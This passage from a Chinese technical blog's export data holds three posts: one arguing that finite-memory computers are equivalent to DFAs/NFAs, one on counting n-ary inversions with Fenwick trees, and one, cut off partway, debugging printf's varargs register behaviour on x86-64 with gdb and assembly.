计算理论\ndescription: 区别于图灵机的无限纸带，现实的计算机只有有限存储，所以其不是TM，而是DFA/NFA\ncategories:\n- 计算理论\n\n---\n\n### $B=\\\\{0^n1^n|n\\ge0\\\\}$ \n\n- Michael Sipser 的 *Introduction to the Theory of Computation* 的1.4提到一个非正则语言的例子，$B=\\\\{0^n1^n|n\\ge0\\\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别\n- 但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢\n- 事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值\n- 如果是n处于一定范围内，容易构造出一台DFA识别B：\n  - 设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量\n  - 那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集\n  - 转移方程为\n    - 首先： $<0,0>\\rightarrow<1,0>\\rightarrow<2,0>\\rightarrow...\\rightarrow<1000,0>$\n    - 然后：从任意$<n,0>$ 都可以转移到 $<n,1>$\n    - 然后：一旦转移到 $<n,1>$ ，就不能转移到 $<n+k,m>, (k>0)$ ，也就是不能增长n的值\n    - 最后：一旦转移到 $<n, n>$ 就accept\n\n### 为什么现实中的计算机有可能是DFA\n\n- 计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能\n\n### 对任意一段代码构造等价的NFA\n\n##### NFA构造方法描述\n\n- 假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$<c1,c2,c3,c4,c5>$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）\n\n\n- 输入字符表是$\\\\{0,1\\\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。\n\n\n- 假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$<0,0,0,0,0>$ 就是起始态\n- 假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$<1,2,3,4,5>$ 就是该NFA的accept state\n- 该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$<d1,d2,d3,d4,d5>$ ，输入后处于 $<d6,d7,d8,d9,d10>$ ，则在从$<d1,d2,d3,d4,d5>$ 到 $<d6,d7,d8,d9,d10>$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ \n\n##### 为什么该NFA只接受允许的字符串，而不会接受多余的字符串\n\n- 首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串\n- 设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA\n- 则最终的NFA只接受允许的字符串\n\n##### 是否会出现情况：代码两次处于某状态但是行为不一样\n\n- 答案是肯定不会\n- 计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的\n\n### 对任意一台计算机构造等价的DFA\n\n- 对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算\n- 先说明一些前置情况：\n  - 现实中计算机使用源码处理特定的输入\n  - 把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M\n- 因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA\n- 然后开始构造DFA\n  - 该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个\n  - DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态\n  - 第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态\n- 从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合\n\n### 计算机可以死循环，DFA不会死循环，为什么\n\n- consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。\n\n\n- 因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。\n\n- 在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环\n\n- 截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变\n\n- 而按照*Introduction to the Theory of Computation* 的1.2节的*EQUIVALENCE OF NFAS AND DFAS*DFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：\n\n  {% asset_img 1.png %}\n\n  $E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了\n\n","content":"<h3 id=\"B-0-n1-n-n-ge0\"><a href=\"#B-0-n1-n-n-ge0\" class=\"headerlink\" title=\"$B=\\{0^n1^n|n\\ge0\\}$\"></a>$B=\\{0^n1^n|n\\ge0\\}$</h3><ul>\n<li>Michael Sipser 的 <em>Introduction to the Theory of Computation</em> 的1.4提到一个非正则语言的例子，$B=\\{0^n1^n|n\\ge0\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别</li>\n<li>但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢</li>\n<li>事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值</li>\n<li>如果是n处于一定范围内，容易构造出一台DFA识别B：<ul>\n<li>设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量</li>\n<li>那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集</li>\n<li>转移方程为<ul>\n<li>首先： $&lt;0,0&gt;\\rightarrow&lt;1,0&gt;\\rightarrow&lt;2,0&gt;\\rightarrow…\\rightarrow&lt;1000,0&gt;$</li>\n<li>然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$</li>\n<li>然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值</li>\n<li>最后：一旦转移到 $&lt;n, n&gt;$ 就accept</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"为什么现实中的计算机有可能是DFA\"><a href=\"#为什么现实中的计算机有可能是DFA\" class=\"headerlink\" title=\"为什么现实中的计算机有可能是DFA\"></a>为什么现实中的计算机有可能是DFA</h3><ul>\n<li>计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能</li>\n</ul>\n<h3 id=\"对任意一段代码构造等价的NFA\"><a href=\"#对任意一段代码构造等价的NFA\" class=\"headerlink\" title=\"对任意一段代码构造等价的NFA\"></a>对任意一段代码构造等价的NFA</h3><h5 id=\"NFA构造方法描述\"><a href=\"#NFA构造方法描述\" class=\"headerlink\" title=\"NFA构造方法描述\"></a>NFA构造方法描述</h5><ul>\n<li>假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）</li>\n</ul>\n<ul>\n<li>输入字符表是$\\{0,1\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。</li>\n</ul>\n<ul>\n<li>假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态</li>\n<li>假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state</li>\n<li>该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ </li>\n</ul>\n<h5 id=\"为什么该NFA只接受允许的字符串，而不会接受多余的字符串\"><a href=\"#为什么该NFA只接受允许的字符串，而不会接受多余的字符串\" class=\"headerlink\" title=\"为什么该NFA只接受允许的字符串，而不会接受多余的字符串\"></a>为什么该NFA只接受允许的字符串，而不会接受多余的字符串</h5><ul>\n<li>首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串</li>\n<li>设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA</li>\n<li>则最终的NFA只接受允许的字符串</li>\n</ul>\n<h5 id=\"是否会出现情况：代码两次处于某状态但是行为不一样\"><a href=\"#是否会出现情况：代码两次处于某状态但是行为不一样\" class=\"headerlink\" title=\"是否会出现情况：代码两次处于某状态但是行为不一样\"></a>是否会出现情况：代码两次处于某状态但是行为不一样</h5><ul>\n<li>答案是肯定不会</li>\n<li>计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的</li>\n</ul>\n<h3 id=\"对任意一台计算机构造等价的DFA\"><a href=\"#对任意一台计算机构造等价的DFA\" class=\"headerlink\" title=\"对任意一台计算机构造等价的DFA\"></a>对任意一台计算机构造等价的DFA</h3><ul>\n<li>对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算</li>\n<li>先说明一些前置情况：<ul>\n<li>现实中计算机使用源码处理特定的输入</li>\n<li>把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M</li>\n</ul>\n</li>\n<li>因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA</li>\n<li>然后开始构造DFA<ul>\n<li>该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个</li>\n<li>DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态</li>\n<li>第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态</li>\n</ul>\n</li>\n<li>从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合</li>\n</ul>\n<h3 id=\"计算机可以死循环，DFA不会死循环，为什么\"><a href=\"#计算机可以死循环，DFA不会死循环，为什么\" class=\"headerlink\" title=\"计算机可以死循环，DFA不会死循环，为什么\"></a>计算机可以死循环，DFA不会死循环，为什么</h3><ul>\n<li>consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。</li>\n</ul>\n<ul>\n<li><p>因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。</p>\n</li>\n<li><p>在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环</p>\n</li>\n<li><p>截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变</p>\n</li>\n<li><p>而按照<em>Introduction to the Theory of Computation</em> 的1.2节的<em>EQUIVALENCE OF NFAS AND DFAS</em>DFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：</p>\n<img src=\"/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/1.png\">\n<p>$E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了</p>\n</li>\n</ul>\n","slug":"有限存储的计算机等价于有限自动机（DFA、NFA）","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"DFA","slug":"DFA","permalink":"https://h-zex.github.io/tags/DFA/"},{"name":"NFA","slug":"NFA","permalink":"https://h-zex.github.io/tags/NFA/"},{"name":"有限自动机","slug":"有限自动机","permalink":"https://h-zex.github.io/tags/有限自动机/"},{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/tags/计算理论/"}]},{"title":"n元逆序对数量求解","date":"2018-03-19T16:05:01.000Z","path":"2018/03/20/n元逆序对数量求解/","text":"以下思路都是针对从小到大排序的序列的逆序对 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n] 首先看看如何求二元逆序对 从左到右扫描序列，对于序列中位置为i的值x，flag[x]+=1 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i] 那么result的数组的和就是逆序对的数量 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n]; 同样扫描序列，对于位置为i的数x，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量 求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中 到最后，result_3就是结果 更多元组的也如此思路 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对 对于n元逆序对，同理，数组记录了当前已有的数x作为最后一个元素是x的n-1元逆序对的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与比他大的数代表的n-1元逆序对形成了更长的逆序对 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第i位的值是x） 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）","raw":"---\ntitle: n元逆序对数量求解\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-03-20 00:05:01\ntags:\n- 算法\n- 树状数组\ndescription: n元逆序对数量求解并利用树状数组优化\ncategories:\n- 算法\n---\n\n> 以下思路都是针对从小到大排序的序列的逆序对\n\n- 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i>x_{i+1}>x_{i+2}>...$那么就是逆序对\n- 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量\n- 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]\n- 首先看看如何求二元逆序对\n   - 从左到右扫描序列，对于序列中位置为`i`的值`x`，flag[x]+=1\n   - 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]\n   - 那么result的数组的和就是逆序对的数量\n   - 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对\n- 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result\\_2数组)，此时设另外的两个数组int flag\\_3[MAX+1], int result_3[n];\n   - 同样扫描序列，对于位置为`i`的数`x`，取出result\\_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag\\_3[x]记录了截止目前，以x结尾的二元组逆序对的数量\n   - 求$\\sum_{j=x+1}^{MAX}flag\\_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中\n   - 到最后，result_3就是结果\n- 更多元组的也如此思路\n- 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对\n- 对于n元逆序对，同理，数组记录了当前已有的数`x`作为`最后一个元素是x的n-1元逆序对`的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与`比他大的数代表的n-1元逆序对`形成了更长的逆序对\n- 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第`i`位的值是`x`）\n\n> 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）\n","content":"<blockquote>\n<p>以下思路都是针对从小到大排序的序列的逆序对</p>\n</blockquote>\n<ul>\n<li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li>\n<li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li>\n<li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li>\n<li>首先看看如何求二元逆序对<ul>\n<li>从左到右扫描序列，对于序列中位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li>\n<li>然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li>\n<li>那么result的数组的和就是逆序对的数量</li>\n<li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li>\n</ul>\n</li>\n<li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul>\n<li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li>\n<li>求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li>\n<li>到最后，result_3就是结果</li>\n</ul>\n</li>\n<li>更多元组的也如此思路</li>\n<li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li>\n<li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li>\n<li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li>\n</ul>\n<blockquote>\n<p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p>\n</blockquote>\n","slug":"n元逆序对数量求解","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/tags/算法/"},{"name":"树状数组","slug":"树状数组","permalink":"https://h-zex.github.io/tags/树状数组/"}]},{"title":"printf的一个异常现象引发的对x86-64体系下可变参数传参的探究","date":"2018-01-19T03:31:36.000Z","path":"2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/","text":"测试环境 12345clang version 3.8.1-24 (tags/RELEASE_381/final)Target: x86_64-pc-linux-gnuThread model: posixLinux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) 奇异现象复现 代码 1234567#include &lt;stdio.h&gt;int main()&#123; double a = 6.0; printf(\"%lx\\n\" , a);&#125; 执行结果 这段代码用的运行结果是随机的，无规律的，这是非常奇怪的 先说原因 printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 a 因为是double类型，所以放在xmm0寄存器。 分析 先看glibc-2.26中stdio-common/printf.c的源码 123456789101112int__printf (const char *format, ...)&#123; va_list arg; int done; va_start (arg, format); done = vfprintf (stdout, format, arg); va_end (arg); return done;&#125; 可以看到，使用的是stdarg的机制实现可变参数传参。 如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参 复习一下CSAPP第三章 可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器 那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 a 因为是double类型，所以放在xmm0寄存器。 GDB调试 使用 clang -S d.c &amp;&amp; clang d.s -g命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点 main函数部分汇编代码 12345678subq $16, %rspmovabsq $.L.str, %rdi # .L.str就是&quot;%lx\\n&quot;movsd .LCPI0_0, %xmm0 # 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0movsd %xmm0, -8(%rbp)movsd -8(%rbp), %xmm0 movb $1, %alcallq printf 可以看到，double a 确实放在了xmm0, 用GDB在 callq printf 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器 （红框内是前四个传参的通用目的寄存器） 执行gdb 的next指令 ，运行callq printf这条指令，检查输出 可以看到，与rsi寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数 手动修改汇编代码，在callq printf之前加上一条movq $16, %rsi（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制） 1234567movabsq $.L.str, %rdimovsd .LCPI0_0, %xmm0 # xmm0 = mem[0],zeromovsd %xmm0, -8(%rbp)movsd -8(%rbp), %xmm0 # xmm0 = mem[0],zeromovb $1, %almovq $16, %rsi # 这一条就是加上去的callq printf 运行，结果是 符合预期，与rsi寄存器的东西一样 分析结果得到证实 探究过程出现的一些问题 在不合时宜的时刻检查寄存器的值 执行完callq printf后才检查xmm0、xmm1的内容，企图找到double a 执行完callq printf后才检查rdi、rsi的值。 因为printf函数会使用这些寄存器，所以这样检查必然是不行的 关于vc++的一些补充 Visual Studio 2015的参数传递文档 ​ 注意：这里的b不是在xmm0，而是在xmm1，d也是如此 Visual Studio 2015 的 Varargs文档 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值 if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers. 按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。 这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）","raw":"---\ntitle: printf的一个异常现象引发的对x86-64体系下可变参数传参的探究\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-01-19 11:31:36\ntags:\n- printf\n- 操作系统\n- 底层\n- CSAPP\ndescription: x86-64体系下的传参方式使得可变参数的传递出现了一些特别的情况\ncategories:\n- CSAPP\n---\n\n### 测试环境\n\n   ```\nclang version 3.8.1-24 (tags/RELEASE_381/final)\nTarget: x86_64-pc-linux-gnu\nThread model: posix\n\nLinux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)\n   ```\n\n### 奇异现象复现\n\n- 代码\n\n   ```c\n\n    #include <stdio.h>\n    int main()\n    {\n        double a = 6.0;\n        printf(\"%lx\\n\"\t, a);\n    }\n   ```\n\n- 执行结果\n\n  {% asset_img p6.png %}\n\n- 这段代码用的运行结果是随机的，无规律的，这是非常奇怪的\n\n### 先说原因\n\n- printf因为使用的格式化字符串是\"%lx\"所以从通用目的寄存器读取可变参数，但是 `a` 因为是double类型，所以放在xmm0寄存器。\n\n### 分析\n\n- 先看glibc-2.26中`stdio-common/printf.c`的源码\n\n   ```c\n   int\n   __printf (const char *format, ...)\n   {\n     va_list arg;\n     int done;\n\n     va_start (arg, format);\n     done = vfprintf (stdout, format, arg);\n     va_end (arg);\n\n     return done;\n   }\n   ```\n\n- 可以看到，使用的是stdarg的机制实现可变参数传参。\n\n- 如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参\n\n- 复习一下CSAPP第三章\n\n   {% asset_img p1.png %}\n\n   {% asset_img p2.png %}\n\n- 可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器\n- 那么猜测，这应该是问题所在。printf因为使用的格式化字符串是\"%lx\"所以从通用目的寄存器读取可变参数，但是 `a` 因为是double类型，所以放在xmm0寄存器。\n\n### GDB调试\n\n- 使用 `clang -S d.c &&  clang d.s -g`命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点\n\n- main函数部分汇编代码\n\n  ```assembly\n  subq\t$16, %rsp\n  movabsq\t$.L.str, %rdi\t\t# .L.str就是\"%lx\\n\"\n  movsd\t.LCPI0_0, %xmm0    \t\n  # 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0\n  movsd\t%xmm0, -8(%rbp)\n  movsd\t-8(%rbp), %xmm0        \n  movb\t$1, %al\n  callq\tprintf\n  ```\n\n- 可以看到，double a 确实放在了xmm0,\n\n- 用GDB在 ` callq printf` 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器\n\n  {% asset_img p4.png %}\n\n  （红框内是前四个传参的通用目的寄存器）\n\n- 执行gdb 的`next`指令 ，运行`callq printf`这条指令，检查输出\n\n  {% asset_img p3.png %}\n\n- 可以看到，与`rsi`寄存器的内容一样。可以初步确认，因为格式字符串是\"%lx\"，所以printf在通用目的寄存器读取可变参数\n\n- 手动修改汇编代码，在callq printf之前加上一条`movq $16, %rsi`（注意，此处是十进制，而printf使用的格式字符串是\"%lx\"，所以程序输出的是十六进制）\n\n  ```assembly\n  movabsq\t$.L.str, %rdi\n  movsd\t.LCPI0_0, %xmm0         # xmm0 = mem[0],zero\n  movsd\t%xmm0, -8(%rbp)\n  movsd\t-8(%rbp), %xmm0         # xmm0 = mem[0],zero\n  movb\t$1, %al\n  movq    $16, %rsi \t\t\t\t# 这一条就是加上去的\n  callq\tprintf\n  ```\n\n- 运行，结果是\n\n  {% asset_img p5.png %}\n\n- 